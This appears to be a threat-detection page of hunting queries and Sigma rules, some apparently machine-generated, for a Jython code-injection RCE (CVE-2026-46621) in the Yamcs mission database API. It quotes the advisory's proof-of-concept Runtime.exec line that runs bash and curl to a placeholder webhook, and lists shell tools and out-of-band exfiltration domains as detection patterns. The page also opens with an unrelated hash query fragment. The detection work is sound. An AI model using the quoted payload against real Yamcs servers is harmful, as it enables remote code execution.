// Defender version so the engine can push hash predicates per-side.
let BadHashes = dynamic(["6a0fe6065d76715feebc1526d456db73", "7f624407ae489324e96a708a09c17e6f", "02a43b3423367b9dddc24cc7dfc070df"]);
union
    ( ImFileEvent
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where TargetFileSHA256 in~ (BadHashes)
           or TargetFileSHA1 in~ (BadHashes)
           or TargetFileMD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType,
                  TargetFileName, TargetFilePath, TargetFileSHA256,
                  Cmd = ActingProcessName, Source = "ImFileEvent" ),
    ( ImProcessCreate
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where SHA256 in~ (BadHashes) or SHA1 in~ (BadHashes) or MD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType = TargetProcessName,
                  TargetFileName = TargetProcessName, TargetFilePath = TargetProcessName,
                  TargetFileSHA256 = SHA256,
                  Cmd = TargetProcessCommandLine, Source = "ImProcessCreate" )
| order by TimeGenerated desc

Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → Remote service execution — PsExec / SMB lateral movement
[LLM] Yamcs MDB algorithm PATCH with embedded Jython java.lang.Runtime payload (CVE-2026-46621) Exploitation High
Hunts the CVE-2026-46621 exploitation request: an authenticated HTTP PATCH to /api/mdb/{instance}/realtime/algorithms/{name} whose JSON body contains Jython-to-Java escape strings (java.lang.Runtime, getRuntime, import java). This is the article's exact exploit primitive — overwriting a Python algorithm's text via the MDB REST API to break out of the JSR-223 sandbox. Rationale: Pivots on the exact exploit primitive from the GHSA advisory: PATCH /api/mdb/{instance}/realtime/algorithms/{name} body containing 'java.lang.Runtime', 'getRuntime', or 'import java'. These tokens have no legitimate place in a Python/Jython algorithm in normal Yamcs operations — they are the Jython-to-Java escape. Cross-checked against the GHSA-2g95-6x5q-xjwj advisory PoC. Cross-checked against: • https://github.com/advisories/GHSA-2g95-6x5q-xjwj • https://attack.mitre.org/techniques/T1059/006/ • https://nvd.nist.gov/vuln/detail/CVE-2026-46621
ATT&CKT1190 T1059.006 T1078
Data sourcesWeb.Web
// Yamcs runs as a JVM; web traffic to its REST API is usually proxied or visible as DeviceNetworkEvents to TCP/8090. Defender's HTTP-body visibility is limited — pair with the WAF/reverse-proxy log source.
DeviceNetworkEvents
| where Timestamp > ago(7d)
| where RemotePort == 8090 or LocalPort == 8090
| where InitiatingProcessFileName !in~ ("java.exe","java")
| where AdditionalFields has_any ("PATCH","/api/mdb/","/realtime/algorithms/")
| project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine, RemoteIP, RemotePort, LocalPort, AdditionalFields
| order by Timestamp desc
// Detect HTTP PATCH to Yamcs MDB algorithms endpoint carrying Jython-to-Java escape strings.
let algoEndpoint = @"/api/mdb/[^/]+/realtime/algorithms/";
let jythonPayloadTokens = dynamic(["java.lang.Runtime","getRuntime","import java","Runtime.getRuntime","exec([\"bash\"","exec([\"sh\"","exec([\"cmd\""]);
union isfuzzy=true
(W3CIISLog
  | where TimeGenerated > ago(7d)
  | where csMethod =~ "PATCH"
  | where csUriStem matches regex algoEndpoint
  | extend Src = cIP, User = csUserName, Uri = strcat(csUriStem, iff(isnotempty(csUriQuery), strcat("?", csUriQuery), "")), UA = csUserAgent, Body = ""
  | project TimeGenerated, Src, User, Uri, UA, Body, Status = scStatus),
(CommonSecurityLog
  | where TimeGenerated > ago(7d)
  | where RequestMethod =~ "PATCH"
  | where RequestURL matches regex algoEndpoint
  | extend Src = SourceIP, User = SourceUserName, Uri = RequestURL, UA = RequestClientApplication, Body = coalesce(AdditionalExtensions, Message), Status = tostring(EventOutcome)
  | project TimeGenerated, Src, User, Uri, UA, Body, Status),
(ImWebSession
  | where TimeGenerated > ago(7d)
  | where HttpMethod =~ "PATCH"
  | where Url matches regex algoEndpoint
  | extend Src = SrcIpAddr, User = SrcUsername, Uri = Url, UA = HttpRequestHeaderUserAgent, Body = "", Status = tostring(HttpStatusCode)
  | project TimeGenerated, Src, User, Uri, UA, Body, Status)
| where Body has_any (jythonPayloadTokens) or Uri has_any (jythonPayloadTokens)
| order by TimeGenerated desc
title: Yamcs MDB Algorithm PATCH with Jython java.lang.Runtime Payload (CVE-2026-46621)
id: 6a3e9b1c-2d4e-4b1e-9b6f-7e8b1c2d4e3a
status: experimental
description: Detects HTTP PATCH to the Yamcs Mission Database algorithms endpoint with a request body containing Jython-to-Java escape strings used in CVE-2026-46621 (java.lang.Runtime / getRuntime / import java).
references:
  - https://github.com/advisories/GHSA-2g95-6x5q-xjwj
author: SOC Detection Engineering
date: 2026/05/28
tags:
  - attack.initial_access
  - attack.execution
  - attack.t1190
  - attack.t1059.006
  - cve.2026.46621
logsource:
  category: webserver
detection:
  selection_method:
    cs-method: 'PATCH'
  selection_uri:
    cs-uri-stem|contains:
      - '/api/mdb/'
      - '/realtime/algorithms/'
  selection_payload:
    cs-uri-query|contains:
      - 'java.lang.Runtime'
      - 'getRuntime'
      - 'import java'
      - 'Runtime.getRuntime'
  condition: selection_method and selection_uri and selection_payload
falsepositives:
  - Internal red-team / vulnerability scanners replaying the PoC
  - Yamcs developers legitimately referencing java.lang in algorithm text (rare — algorithms are domain-specific)
level: high
(source:nginx OR source:apache OR source:haproxy OR source:linux.syslog) @http.method:PATCH @http.url_details.path:*/api/mdb/*/realtime/algorithms/* (@http.request.body:(*java.lang.Runtime* OR *getRuntime* OR *"import java"*) OR @http.url_details.queryString:(*java.lang.Runtime* OR *getRuntime*))
// Falcon FDR generally does not capture HTTP request bodies. Closest pivot is post-exploitation process tree (see UC 2). Returning host-side hit on the curl beacon that the payload triggers.
#event_simpleName=ProcessRollup2
| ImageFileName=/\/curl$/i OR ImageFileName=/\/bash$/i OR ImageFileName=/\/sh$/i
| ParentBaseFileName=/^java$/i
| CommandLine=/RCE|webhook|interactsh|requestbin|ngrok|trycloudflare/i
| groupBy([aid, ComputerName, ImageFileName, ParentBaseFileName, CommandLine], function=count())

[LLM] Yamcs JVM spawns shell or network utility (CVE-2026-46621 post-exploitation) Installation High
Hunts the host-side payoff of CVE-2026-46621: a java/jython process under the Yamcs service forking bash, sh, curl, wget, nc, python or similar OS utilities. Yamcs is a telemetry processing JVM — under normal operations its process tree does not fork shells or network clients. Rationale: Article PoC: 'java.lang.Runtime.getRuntime().exec(["bash", "-c", "curl https://<YOUR-WEBHOOK-URL>/RCE"])' — the Yamcs JVM directly forks bash + curl. Pinning to parent=java/jython with a yamcs-context check on the parent commandline keeps FPs near zero because the Yamcs JVM has no legitimate need to fork shells. Cross-checked against MITRE T1059.006 (Python) and T1059.004 (Unix Shell). Cross-checked against: • https://github.com/advisories/GHSA-2g95-6x5q-xjwj • https://attack.mitre.org/techniques/T1059/004/ • https://attack.mitre.org/techniques/T1059/006/
ATT&CKT1059.004 T1059.006 T1190
Data sourcesEndpoint.Processes
DeviceProcessEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName in~ ("java","java.exe","jython")
| where FileName in~ ("bash","sh","dash","zsh","curl","wget","nc","ncat","python","python3","perl","powershell.exe","cmd.exe","pwsh","pwsh.exe")
| where InitiatingProcessCommandLine has_any ("yamcs","jython","algorithm","ScriptEngine","AlgorithmManager") or InitiatingProcessFolderPath has_any ("yamcs","jython")
| project Timestamp, DeviceName, AccountName,
          ParentImage = InitiatingProcessFolderPath,
          ParentCmd   = InitiatingProcessCommandLine,
          ChildImage  = FolderPath,
          ChildCmd    = ProcessCommandLine,
          SHA256
| order by Timestamp desc
// Sentinel: Yamcs JVM (java/jython) spawning a shell or network utility — host-side CVE-2026-46621 payoff.
let ShellOrNet = dynamic(["bash","sh","dash","zsh","curl","wget","nc","ncat","python","python3","perl","powershell.exe","cmd.exe","pwsh","pwsh.exe"]);
let YamcsCtx = dynamic(["yamcs","jython","algorithm","ScriptEngine","AlgorithmManager"]);
union isfuzzy=true
(ImProcessCreate
  | where TimeGenerated > ago(7d)
  | where ParentProcessName has_any ("java","jython")
  | where TargetProcessName has_any (ShellOrNet)
  | where ParentProcessCommandLine has_any (YamcsCtx) or ActingProcessCommandLine has_any (YamcsCtx) or TargetProcessCommandLine has_any (YamcsCtx)
  | project TimeGenerated, Host = DvcHostname, User = ActorUsername,
            ParentImage = ParentProcessName, ParentCmd = ParentProcessCommandLine,
            ChildImage = TargetProcessName, ChildCmd = TargetProcessCommandLine),
(SecurityEvent
  | where TimeGenerated > ago(7d)
  | where EventID == 4688
  | where ParentProcessName has_any ("java.exe","jython.exe","\\java","\\jython")
  | where NewProcessName has_any ("\\bash.exe","\\sh.exe","\\powershell.exe","\\pwsh.exe","\\cmd.exe","\\curl.exe","\\wget.exe","\\nc.exe","\\ncat.exe","\\python.exe","\\python3.exe")
  | where CommandLine has_any (YamcsCtx) or ParentProcessName has_any (YamcsCtx)
  | project TimeGenerated, Host = Computer, User = SubjectUserName,
            ParentImage = ParentProcessName, ParentCmd = "",
            ChildImage = NewProcessName, ChildCmd = CommandLine),
(Syslog
  | where TimeGenerated > ago(7d)
  | where Facility =~ "authpriv" or ProcessName has_any ("audit","auditd","sudo")
  | where SyslogMessage has "java" and SyslogMessage has_any (ShellOrNet)
  | where SyslogMessage has_any (YamcsCtx)
  | project TimeGenerated, Host = HostName, User = "", ParentImage = "java", ParentCmd = SyslogMessage, ChildImage = "", ChildCmd = "")
| order by TimeGenerated desc
title: Yamcs JVM Spawns Shell or Network Utility (CVE-2026-46621)

status: experimental
description: Detects a Yamcs java/jython process spawning a shell or network utility — the host-side payoff of the CVE-2026-46621 Jython algorithm code-injection RCE.

[LLM] Yamcs Java process beacons to webhook / interact / tunneling service (CVE-2026-46621 C2) Command & Control High
Hunts the article's C2 footprint: the Yamcs JVM (or a curl/wget it spawned) making an outbound connection to short-lived webhook / out-of-band-interaction services (webhook.site, requestbin, interactsh, ngrok, trycloudflare, beeceptor). Anchored to the Yamcs JVM as initiating process so we don't blanket-alert on internet usage. Rationale: Article PoC literally calls 'curl https://<YOUR-WEBHOOK-URL>/RCE' from Runtime.exec. Anchoring to (a) the Yamcs JVM or a curl/wget spawned by it AND (b) the well-known OOB-interaction domain list keeps this high-signal: a Yamcs telemetry server has no legitimate need to talk to webhook.site or interactsh. Cross-checked against the CVE-2026-46621 PoC and ProjectDiscovery's Interactsh public domain list. Cross-checked against: • https://github.com/advisories/GHSA-2g95-6x5q-xjwj • https://github.com/projectdiscovery/interactsh • https://attack.mitre.org/techniques/T1071/001/
ATT&CKT1071.001 T1105
Data sourcesNetwork_Traffic.All_Traffic Network_Resolution.DNS
let oobDomains = dynamic(["webhook.site","requestbin.com","requestbin.net","en7","interact.sh","interactsh","oast.fun","oast.live","oast.me","oast.online","oast.pro","oast.site","burpcollaborator.net","ngrok.io","ngrok-free.app","trycloudflare.com","beeceptor.com","pipedream.net","requestcatcher.com"]);
DeviceNetworkEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName in~ ("java","java.exe","jython","curl","curl.exe","wget","wget.exe")
| where (RemoteUrl has_any (oobDomains)) or (isnotempty(AdditionalFields) and AdditionalFields has_any (oobDomains))
| project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessParentFileName, RemoteIP, RemotePort, RemoteUrl, Protocol
| order by Timestamp desc
let oobDomains = dynamic(["webhook.site","requestbin.com","requestbin.net","interact.sh","oast.fun","oast.live","oast.me","oast.online","oast.pro","oast.site","burpcollaborator.net","ngrok.io","ngrok-free.app","trycloudflare.com","beeceptor.com","pipedream.net","requestcatcher.com"]);
union isfuzzy=true
(DnsEvents
  | where TimeGenerated > ago(7d)
  | where Name has_any (oobDomains)
  | project TimeGenerated, Host = Computer, Src = ClientIP, Domain = Name, Process = "", Cmd = ""),
(CommonSecurityLog
  | where TimeGenerated > ago(7d)
  | where RequestURL has_any (oobDomains) or DestinationHostName has_any (oobDomains)
  | project TimeGenerated, Host = SourceHostName, Src = SourceIP, Domain = coalesce(DestinationHostName, RequestURL), Process = SourceProcessName, Cmd = ""),
(ImNetworkSession
  | where TimeGenerated > ago(7d)
  | where DstHostname has_any (oobDomains) or Url has_any (oobDomains)
  | project TimeGenerated, Host = DvcHostname, Src = SrcIpAddr, Domain = coalesce(DstHostname, Url), Process = "", Cmd = ""),
(ImWebSession
  | where TimeGenerated > ago(7d)
  | where HttpHostName has_any (oobDomains) or Url has_any (oobDomains)
  | project TimeGenerated, Host = DvcHostname, Src = SrcIpAddr, Domain = coalesce(HttpHostName, Url), Process = "", Cmd = "")
| order by TimeGenerated desc
